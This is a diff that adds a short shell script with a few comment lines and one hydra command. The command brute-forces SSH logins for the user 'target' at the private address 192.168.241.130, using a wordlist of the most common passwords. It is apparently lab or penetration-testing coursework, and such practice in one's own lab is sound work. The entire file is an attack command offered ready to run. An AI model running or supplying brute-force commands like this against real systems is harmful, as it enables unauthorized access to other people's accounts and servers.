@@ -1,0 +1,6 @@
+# SSH brute-force attack against target using a custom password list
+# -l target   : target username
+# -P passwords.txt : wordlist of top 20 most common passwords according to NordPass
+# -t 4        : 4 parallel tasks
+
+hydra -l target -P passwords.txt -t 4 ssh://192.168.241.130
